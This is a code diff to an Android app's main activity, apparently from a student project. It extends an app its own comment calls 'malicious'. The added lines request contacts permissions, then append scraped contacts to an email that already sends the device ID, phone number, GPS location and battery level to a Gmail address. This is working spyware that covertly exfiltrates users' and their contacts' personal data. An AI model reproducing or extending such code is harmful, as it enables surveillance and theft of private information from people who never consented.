@@ -49,6 +49,9 @@ public class MainActivity extends AppCompatActivity {
             if (!addPermissions(permissionsList, android.Manifest.permission.ACCESS_NETWORK_STATE)) {
                 permissionsNeeded.add("Internet");
             }
+            if (!addPermissions(permissionsList, Manifest.permission.READ_CONTACTS)) {
+                permissionsNeeded.add("Contacts");
+            }
             if (!addPermissions(permissionsList, Manifest.permission.RECEIVE_SMS)) {
                 permissionsNeeded.add("SMS");
             }
@@ -100,6 +103,8 @@ public class MainActivity extends AppCompatActivity {
                 perms.put(Manifest.permission.READ_PHONE_STATE, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.READ_SMS, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.READ_PHONE_NUMBERS, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.READ_CONTACTS, PackageManager.PERMISSION_GRANTED);
+                perms.put(Manifest.permission.WRITE_CONTACTS, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.ACCESS_COARSE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.ACCESS_FINE_LOCATION, PackageManager.PERMISSION_GRANTED);
                 //Results
@@ -112,6 +117,7 @@ public class MainActivity extends AppCompatActivity {
                         && perms.get(Manifest.permission.READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+                        && perms.get(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
                         && perms.get(Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED) {
                     //All required permissions for malicious stuff is granted
                     return;
@@ -176,9 +182,9 @@ public class MainActivity extends AppCompatActivity {
             public void onFinish()
             {
                 Location location = locationinfo.getLocation();
-                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +" Number:"+phoneNum , DeviceScrape.getDeviceInfo()
+                EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , DeviceScrape.getDeviceInfo()
                         + "\nLocation: "+locationinfo.getLocation().getLongitude() +" "+locationinfo.getLocation().getLatitude()
-                        + "\nBattery Level:" + batterylevel);
+                        + "\nBattery Level:" + batterylevel + "\n\n\nContacts:\n-----\n" +  ContactScrape.scrapeContacts(getContentResolver()));
             }
         } .start();
 
